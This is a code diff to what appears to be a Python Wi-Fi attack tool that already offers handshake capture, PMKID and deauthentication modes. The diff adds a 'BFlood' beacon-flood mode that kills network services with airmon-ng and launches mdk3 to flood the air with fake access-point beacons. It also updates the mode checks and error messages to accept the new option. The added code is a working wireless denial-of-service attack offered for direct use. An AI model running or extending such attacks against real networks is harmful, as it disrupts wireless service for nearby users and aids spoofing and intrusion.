@@ -72,6 +72,7 @@ def menu_panel():
     get_colours(f"\t Handshake", "blue")
     get_colours(f"\t PKMID", "blue")
     get_colours(f"\t DAuth (Deauthentication attack)", "blue")
+    get_colours(f"\t BFlood (Beacon flood attack)", "blue")
     print("")
     print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
@@ -286,6 +287,15 @@ def attack_func(network_interface, attack_mode):
                 os.kill(pid, signal.SIGKILL)
         get_colours("\n\n\n[*] Attack completed successfully", 'green')
         quit_program()
+    # Beacon Flood Attack Mode
+    elif attack_mode == "BFlood":
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+        os.system('clear')
+        get_colours("[*] Starting the attack...", 'blue')
+        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
+        os.system(
+            f"xterm -hold -e sudo mdk3 {network_interface}mon b -s 500")
+        quit_program()
 
 
 def quit_program():
@@ -307,20 +317,20 @@ def check_parms():
             if len(sys.argv) > 3:
                 if len(sys.argv) > 4:
                     check_interface_exist = subprocess.run(["ip", "a"], capture_output=True, text=True)
-                    check_attack_mode = ["Handshake", "PKMID", "DAuth"]
+                    check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
                     if sys.argv[2] not in check_interface_exist.stdout:
                         get_colours("\nInvalid Network Interface name (Ej: wlan0 / eth0)", "red")
                         print(Fore.WHITE)
                     elif sys.argv[4] not in check_attack_mode:
-                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
+                        get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                         print(Fore.WHITE)
                     else:
                         check_deps()  # Check for necessary program to run this script.
                 else:
-                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
+                    get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                     print(Fore.WHITE)
             else:
-                get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth)", "red")
+                get_colours("\nSelect a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                 print(Fore.WHITE)
         else:
             get_colours("\nSelect a valid Interface (wlan0 / eth0)", "red")
